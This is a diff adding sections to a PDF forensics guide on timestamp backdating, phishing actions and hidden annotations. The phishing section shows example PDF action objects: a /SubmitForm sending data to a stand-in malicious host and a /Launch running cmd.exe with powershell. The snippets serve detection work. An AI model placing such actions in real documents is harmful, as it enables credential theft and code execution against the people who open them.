@@ -35,6 +35,61 @@ The 'File Created' and 'File Modified' columns show timestamps from the computer
 
 ---
 
+## Timestamp Spoofing (Backdating)
+**Classification:** <red>YES</red>
+
+**What it means:** The file system creation date is significantly older than the internal PDF creation date. This is physically impossible under normal circumstances and strongly indicates the system clock was rolled back or the file timestamp was artificially manipulated (timestomped).
+
+### Manual Parsing Instructions:
+
+**Step 1: Check File System Timestamps**
+1. Right-click the file in Windows -> Properties -> Details
+2. Note the "Date created"
+
+**Step 2: Check PDF Internal Timestamps**
+1. Use ExifTool or open the PDF in a hex editor
+2. Search for `/CreationDate`
+3. Decode the timestamp format (e.g., `D:YYYYMMDDHHmmSS`)
+
+**Step 3: Compare Timestamps**
+If the external File System creation date is *older* than the internal PDF `/CreationDate`, the file has been tampered with.
+
+---
+
+## Phishing Directives (SubmitForm / Launch)
+**Classification:** <red>YES</red>
+
+**What it means:** The PDF contains actions that can submit form data to an external URL or launch external files/applications. These are commonly used in malicious phishing PDFs.
+
+### Manual Parsing Instructions:
+
+**Step 1: Search for Actions**
+Search for `/Action` dictionaries. Specifically, look for:
+- `/S /SubmitForm`
+- `/S /Launch`
+
+**Step 2: Decode the Actions**
+For `/SubmitForm`:
+Search near the action for `/F` to find the target URL where data is being sent.
+```
+/Action <<
+  /S /SubmitForm
+  /F (http://malicious-site.com/login.php)
+>>
+```
+
+For `/Launch`:
+Search for `/F` or `/Win` dictionaries to see what file or application is being executed.
+```
+/Action <<
+  /S /Launch
+  /F (cmd.exe)
+  /Win << /F (cmd.exe) /P (/c powershell.exe ...) >>
+>>
+```
+
+---
+
 ## TouchUp_TextEdit
 **Classification:** <red>YES</red>
 
@@ -218,6 +273,37 @@ comm -23 referenced.txt defined.txt
 ---
 
 # MEDIUM-CONFIDENCE INDICATORS (Indications Found - Yellow)
+
+---
+
+## Hidden Annotations
+**Classification:** <yellow>Indications Found</yellow>
+
+**What it means:** The PDF contains annotations (like text boxes, links, or file attachments) with the `Hidden` or `Invisible` flags set. This may indicate an attempt to obscure content or smuggle data inside the PDF without it being visible when printed or viewed.
+
+### Manual Parsing Instructions:
+
+**Step 1: Find Annotation Arrays**
+Search for `/Annots` which lists annotations for a page.
+
+**Step 2: Inspect Annotation Flags**
+Find the individual annotation object (e.g., `/Type /Annot`). Look for the `/F` (Flags) integer:
+```
+10 0 obj
+<<
+  /Type /Annot
+  /Subtype /Text
+  /F 2
+>>
+```
+
+**Step 3: Decode Flag Values**
+The `/F` entry is a bitmask.
+- Bit 1 (value 1): Invisible (If set, do not display)
+- Bit 2 (value 2): Hidden (Do not display or print)
+- Bit 6 (value 32): NoView (Do not display on screen)
+
+If the integer has bit 2 (Hidden) or bit 1 (Invisible) set, it is suspicious.
 
 ---
 
